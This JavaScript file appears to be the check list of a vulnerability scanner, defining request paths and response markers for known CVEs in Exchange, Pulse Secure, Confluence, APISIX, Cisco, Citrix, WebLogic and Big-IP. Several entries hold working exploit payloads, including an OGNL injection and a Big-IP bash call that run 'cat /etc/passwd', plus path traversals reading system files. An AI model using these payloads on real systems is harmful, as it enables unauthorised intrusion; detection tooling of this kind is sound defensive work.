export const poc = [{
    // UNTESTED!!! remove and test version
    title: "RCE: Exchange Server Proxyshell (CVE-2021-34473)",
    rootPaths: [
        "/autodiscover/autodiscover.json?@foo.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@foo.com"
    ],
    detectResponses: ["Connectivity Endpoint"],
    tags: ["exchange"],
    cat: "cat-panic",
    critLevel: 3
},
{
    // UNTESTED!!!
    title: "LFI: Pulse Secure Pulse (CVE-2019-11510)",
    rootPaths: [
        "/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/"
    ],
    detectResponses: ["root"],
    detectStatusCodes: ["200"],
    tags: ["pulse"],
    cat: "cat-panic",
    critLevel: 2
},
{
    title: "RCE: Confluence Server (CVE-2022-26134)",
    rootPaths: [
        //'%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22cat /etc/passwd%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/'
        "/%24%7B%28%23a%3D%40org%2Eapache%2Ecommons%2Eio%2EIOUtils%40toString%28%40java%2Elang%2ERuntime%40getRuntime%28%29%2Eexec%28%22cat /etc/passwd%22%29%2EgetInputStream%28%29%2C%22utf%2D8%22%29%29%2E%28%40com%2Eopensymphony%2Ewebwork%2EServletActionContext%40getResponse%28%29%2EsetHeader%28%22X%2DCmd%2DResponse%22%2C%23a%29%29%2E%28%40com%2Eopensymphony%2Ewebwork%2EServletActionContext%40getResponse%28%29%2EsendError%28500%29%29%7D/"
    ],
    detectHeaders: ["x-cmd-response"],
    tags: ["confluence"],
    cat: "cat-panic",
    critLevel: 3
}, {
    // UNTESTED!!!
    title: "Apache APISIX (CVE-2022-24112 )",
    rootPaths: [
        "/apisix/admin/routes?api_key=edd1c9f034335f136f87ad84b625c8f1"
    ],
    detectStatusCodes: ["200"],
    tags: ["apache"],
    cat: "cat-panic",
    critLevel: 3
}, {
    // UNTESTED!!!
    title: "RCE: Cisco Hyperflex (CVE-2021-1497)",
    rootPaths: [
        "/css/..%2findex.htm"
    ],
    detectStatusCodes: ["200"],
    tags: ["cisco"],
    cat: "cat-panic",
    critLevel: 3
}, {
    // UNTESTED!!!
    title: "RCE: Citrix (CVE-2019-19781)",
    rootPaths: [
        "/vpn/../vpns/cfg/smb.conf",
    ],
    detectStatusCodes: ["200"],
    tags: ["citrix"],
    cat: "cat-panic",
    critLevel: 3
},
{
    title: "RCE: Weblogic Console (CVE-2020-14882)",
    rootPaths: [
        "/console/css/%252e%252e%252fconsole.portal"
    ],
    detectStatusCodes: ["200"],
    tags: ["weblogic"],
    cat: "cat-panic",
    critLevel: 3
}, {
    // UNTESTED
    title: "RCE: Big-IP (CVE-2022-1388)",
    method: "POST",
    rootPaths: [
        "/mgmt/tm/util/bash"
    ],
    headers: {
        'Host': '127.0.0.1',
        'Authorization': 'Basic YWRtaW46aG9yaXpvbjM=',
        'X-F5-Auth-Token': 'asdf',
        'Connection': 'X-F5-Auth-Token',
        'Content-Type': 'application/json'
    },
    postJSON: { "command": "run", "utilCmdArgs": "-c 'cat /etc/passwd}'" },
    detectResponses: ["root"],
    tags: ["big-ip"],
    cat: "cat-panic",
    critLevel: 3
}]